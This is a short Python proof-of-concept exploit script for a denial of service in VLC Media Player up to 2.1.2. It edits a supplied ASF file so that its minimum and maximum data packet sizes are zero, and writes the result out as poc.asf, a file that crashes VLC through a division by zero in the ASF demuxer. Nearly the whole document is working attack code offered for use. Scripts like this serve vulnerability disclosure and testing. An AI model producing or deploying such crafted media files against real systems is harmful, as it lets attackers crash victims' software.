#!/usr/bin/python
# VLC Media Player up to 2.1.2 DOS POC Integer Division By zero in ASF Demuxer
# VLC Media Player is prone to DOS utilizing a division by zero error if minimium data packet size
# is equal to zero. this was tested on windows XP sp3 and affects all versions of vlc till latest 2.1.2
# to run this script you need to install python bitstring module
# usage you supply any valid asf and the script will produxe a POC asf that will crash vlc
 
import sys
from bitstring import BitArray
 
f = open(sys.argv[1],'r+b')
 
f.seek(0,2)
 
size = f.tell()
 
print "[*] file size: %d" % size
 
f.seek(0,0)
 
print "[*] ReeeeeWWWWWWiiiiiNNNNNNND"
 
fb = BitArray(f)
 
index  =  fb.find('0xa1dcab8c47a9cf118ee400c00c205365',bytealigned=True)
 
print "[*] found file properties GUID"
print "[*] File properties GUID: %s" % fb[index[0]:(index[0]+128)]
 
# index of minumum packet size in File Proprties header
i_min_data_pkt_size = index[0] +  736
 
print "[*] Original Minimum Data Packet Size: %s" % fb[i_min_data_pkt_size:i_min_data_pkt_size+32].hex
print "[*] Original Maximum Data Packet Size: %s" % fb[i_min_data_pkt_size+32:i_min_data_pkt_size+64].hex
 
# Accroding to ASF standarad the minimum data size and the maximum data size should be equal
print "[*] Changing Miniumum and Maximum Data packet size to 0"
 
# changing the data packets in bit array
 
fb[i_min_data_pkt_size:i_min_data_pkt_size+8] = 0x00
fb[i_min_data_pkt_size+8:i_min_data_pkt_size+16] = 0x00
fb[i_min_data_pkt_size+16:i_min_data_pkt_size+24] = 0x00
fb[i_min_data_pkt_size+24:i_min_data_pkt_size+32] = 0x00
fb[i_min_data_pkt_size+32:i_min_data_pkt_size+40] = 0x00
fb[i_min_data_pkt_size+40:i_min_data_pkt_size+48] = 0x00
fb[i_min_data_pkt_size+48:i_min_data_pkt_size+56] = 0x00
fb[i_min_data_pkt_size+56:i_min_data_pkt_size+64] = 0x00
 
print "[*] POC File Created poc.asf"
 
of = open('poc.asf','w+b')
fb.tofile(of)
of.close()
f.close()
